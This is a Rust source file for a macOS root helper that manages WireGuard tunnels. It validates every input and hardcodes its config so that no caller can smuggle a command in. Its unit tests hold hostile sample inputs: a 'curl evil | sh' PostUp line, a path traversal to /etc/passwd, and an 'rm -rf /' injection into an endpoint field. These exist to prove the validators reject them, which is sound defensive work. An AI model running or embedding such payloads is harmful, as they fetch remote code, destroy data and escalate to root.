//! Burrow's privileged helper.
//!
//! Runs as root under launchd and does the one thing the app cannot: bring a WireGuard tunnel up
//! and down. The app talks to it over a Unix socket, so admin is granted once at install instead
//! of on every connect.
//!
//! # The privilege boundary
//!
//! This is the whole point of the design, so it is worth stating plainly.
//!
//! `wg-quick` executes `PostUp`/`PostDown` from a config **as root**. If this helper accepted a
//! path, anything running as the user could point it at a config containing
//! `PostUp = /bin/sh -c '…'` and get root without a password. Passwordless `sudo wg-quick` has
//! exactly this hole, which is why it is not used here.
//!
//! So the helper accepts neither a path nor config text. It accepts a region name and a handful
//! of typed fields, validates every one, and **writes the config itself** into a root-owned
//! directory with the `PostUp`/`PostDown` lines hardcoded below. There is no input through which
//! a command can reach root.
//!
//! The socket is chowned to the installing user and mode 0600, so only that account can speak to
//! it at all.

use std::io::{BufRead, BufReader, Write};
use std::os::unix::fs::PermissionsExt;
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::{Path, PathBuf};
use std::process::Command;

const SOCKET: &str = "/var/run/burrow-helper.sock";
const CONFIG_DIR: &str = "/Library/Application Support/Burrow/tunnels";
const OWNER_FILE: &str = "/Library/Application Support/Burrow/owner";
const PORT: u16 = 51820;

// Fixed tunnel addressing. Hardcoded rather than accepted from the caller: they are the same for
// every Burrow tunnel, and anything not accepted as input cannot be abused as input.
const CLIENT_V4: &str = "10.8.0.2/32";
const CLIENT_V6: &str = "fd00:8::2/128";
const DNS: &str = "1.1.1.1, 1.0.0.1";

fn log(msg: &str) {
    eprintln!("[burrow-helper] {msg}");
}

// ── validation ────────────────────────────────────────────────────────────
//
// Everything crossing the boundary is checked. A field that fails is refused outright rather than
// sanitised: quietly "fixing" hostile input is how sanitisers get bypassed.

/// AWS region names, which are also the config filenames. Rejecting anything else is what stops
/// `../../etc/something` from ever being built into a path.
fn valid_region(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 32
        && s.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

/// WireGuard keys are 32 bytes of base64: 44 characters ending in '='.
fn valid_key(s: &str) -> bool {
    s.len() == 44
        && s.ends_with('=')
        && s.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
}

fn valid_ip(s: &str) -> bool {
    s.parse::<std::net::IpAddr>().is_ok()
}

fn config_path(region: &str) -> PathBuf {
    Path::new(CONFIG_DIR).join(format!("{region}.conf"))
}

// ── actions ───────────────────────────────────────────────────────────────

/// Write the tunnel config, root-owned and unreadable by anyone else.
///
/// Note what is *not* a parameter: PostUp, PostDown, DNS, addresses. Those are fixed below, so
/// the only things the caller influences are two keys and an address — none of which can carry a
/// command.
fn install(region: &str, private_key: &str, peer_key: &str, endpoint: &str) -> Result<(), String> {
    if !valid_region(region) {
        return Err("bad region".into());
    }
    if !valid_key(private_key) || !valid_key(peer_key) {
        return Err("bad key".into());
    }
    if !valid_ip(endpoint) {
        return Err("bad endpoint".into());
    }

    std::fs::create_dir_all(CONFIG_DIR).map_err(|e| e.to_string())?;
    std::fs::set_permissions(CONFIG_DIR, std::fs::Permissions::from_mode(0o700))
        .map_err(|e| e.to_string())?;

    let conf = format!(
        "[Interface]\n\
         PrivateKey = {private_key}\n\
         Address = {CLIENT_V4}, {CLIENT_V6}\n\
         DNS = {DNS}\n\
         \n\
         [Peer]\n\
         PublicKey = {peer_key}\n\
         Endpoint = {endpoint}:{PORT}\n\
         AllowedIPs = 0.0.0.0/0, ::/0\n\
         PersistentKeepalive = 25\n"
    );
    let path = config_path(region);
    std::fs::write(&path, conf).map_err(|e| e.to_string())?;
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))
        .map_err(|e| e.to_string())?;
    log(&format!("installed config for {region}"));
    Ok(())
}

fn wg_quick() -> Option<&'static str> {
    ["/opt/homebrew/bin/wg-quick", "/usr/local/bin/wg-quick", "/usr/bin/wg-quick"]
        .into_iter()
        .find(|p| Path::new(p).exists())
}

fn run_wg(verb: &str, region: &str) -> Result<String, String> {
    if !valid_region(region) {
        return Err("bad region".into());
    }
    let path = config_path(region);
    if !path.exists() {
        return Err("no config for that region".into());
    }
    let wg = wg_quick().ok_or("wireguard-tools is not installed")?;
    let dir = Path::new(wg).parent().map(|p| p.display().to_string()).unwrap_or_default();

    let out = Command::new(wg)
        .arg(verb)
        .arg(&path)
        // wg-quick shells out to wg, ifconfig and friends; launchd gives a daemon almost no PATH.
        .env("PATH", format!("{dir}:/usr/bin:/bin:/usr/sbin:/sbin"))
        .output()
        .map_err(|e| e.to_string())?;

    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    if out.status.success() {
        Ok(text)
    } else {
        Err(text.trim().to_string())
    }
}

fn remove(region: &str) -> Result<(), String> {
    if !valid_region(region) {
        return Err("bad region".into());
    }
    let _ = run_wg("down", region);
    let _ = std::fs::remove_file(config_path(region));
    Ok(())
}

// ── protocol ──────────────────────────────────────────────────────────────
//
// One JSON object per line in, one per line out. Deliberately minimal: a hand-rolled reader is
// easier to audit than a framework, and this is the attack surface.

fn field<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    // Values here are all constrained character sets validated above, so a simple scan is enough
    // and avoids pulling a JSON parser into a root daemon.
    let pat = format!("\"{key}\":\"");
    let start = line.find(&pat)? + pat.len();
    let rest = &line[start..];
    let end = rest.find('"')?;
    Some(&rest[..end])
}

fn handle(line: &str) -> String {
    let action = field(line, "action").unwrap_or("");
    let region = field(line, "region").unwrap_or("");

    let result: Result<String, String> = match action {
        "ping" => Ok("ok".into()),
        "install" => install(
            region,
            field(line, "private_key").unwrap_or(""),
            field(line, "peer_key").unwrap_or(""),
            field(line, "endpoint").unwrap_or(""),
        )
        .map(|_| "installed".into()),
        "up" => run_wg("up", region).map(|_| "up".into()),
        "down" => run_wg("down", region).map(|_| "down".into()),
        "remove" => remove(region).map(|_| "removed".into()),
        other => Err(format!("unknown action: {other}")),
    };

    match result {
        Ok(msg) => format!("{{\"ok\":true,\"message\":\"{}\"}}\n", escape(&msg)),
        Err(e) => format!("{{\"ok\":false,\"message\":\"{}\"}}\n", escape(&e)),
    }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', " ").replace('\r', " ")
}

fn serve(stream: UnixStream) {
    let peer = stream.try_clone().ok();
    let reader = BufReader::new(stream);
    for line in reader.lines().map_while(Result::ok) {
        let reply = handle(&line);
        if let Some(mut out) = peer.as_ref().and_then(|s| s.try_clone().ok()) {
            let _ = out.write_all(reply.as_bytes());
            let _ = out.flush();
        }
    }
}

fn main() {
    let _ = std::fs::remove_file(SOCKET);
    let listener = match UnixListener::bind(SOCKET) {
        Ok(l) => l,
        Err(e) => {
            log(&format!("cannot bind {SOCKET}: {e}"));
            std::process::exit(1);
        }
    };

    // Only the installing account may talk to this. The socket is chowned to that uid at 0600,
    // so other local users cannot even open it — the check is enforced by the kernel rather than
    // by anything this process has to remember to do per request.
    if let Ok(owner) = std::fs::read_to_string(OWNER_FILE) {
        if let Ok(uid) = owner.trim().parse::<u32>() {
            unsafe {
                let c = std::ffi::CString::new(SOCKET).unwrap();
                libc::chown(c.as_ptr(), uid, 0);
            }
        }
    }
    let _ = std::fs::set_permissions(SOCKET, std::fs::Permissions::from_mode(0o600));
    log("listening");

    for stream in listener.incoming().flatten() {
        std::thread::spawn(move || serve(stream));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn region_validation_blocks_traversal() {
        assert!(valid_region("us-east-1"));
        assert!(valid_region("ap-southeast-2"));
        // The whole reason this function exists.
        assert!(!valid_region("../../etc/passwd"));
        assert!(!valid_region("us-east-1/../../x"));
        assert!(!valid_region("us_east_1"));
        assert!(!valid_region(""));
        assert!(!valid_region(&"a".repeat(33)));
    }

    #[test]
    fn key_validation_matches_wireguard() {
        assert!(valid_key("kXEMeovGoXLarjUz+KjmWwcshz34RgUTjGf9ItppyGg="));
        assert!(!valid_key("short="));
        assert!(!valid_key(&"x".repeat(44)));               // no trailing =
        assert!(!valid_key("kXEMeovGoXLarjUz+KjmWwcsh;34RgUTjGf9ItppyGg=")); // ';' not base64
    }

    #[test]
    fn a_config_cannot_smuggle_a_command() {
        // The attack passwordless sudo on wg-quick would allow: a PostUp that runs as root.
        // Here it cannot even be expressed — PostUp is not an input.
        let evil = "PostUp = /bin/sh -c 'curl evil | sh'";
        assert!(!valid_key(evil));
        assert!(!valid_region(evil));
        assert!(!valid_ip(evil));
    }

    #[test]
    fn endpoint_must_be_an_address() {
        assert!(valid_ip("54.159.77.14"));
        assert!(valid_ip("2001:db8::1"));
        assert!(!valid_ip("evil.com; rm -rf /"));
        assert!(!valid_ip(""));
    }

    #[test]
    fn field_extraction_reads_what_it_should() {
        let line = r#"{"action":"up","region":"us-east-1"}"#;
        assert_eq!(field(line, "action"), Some("up"));
        assert_eq!(field(line, "region"), Some("us-east-1"));
        assert_eq!(field(line, "nope"), None);
    }
}
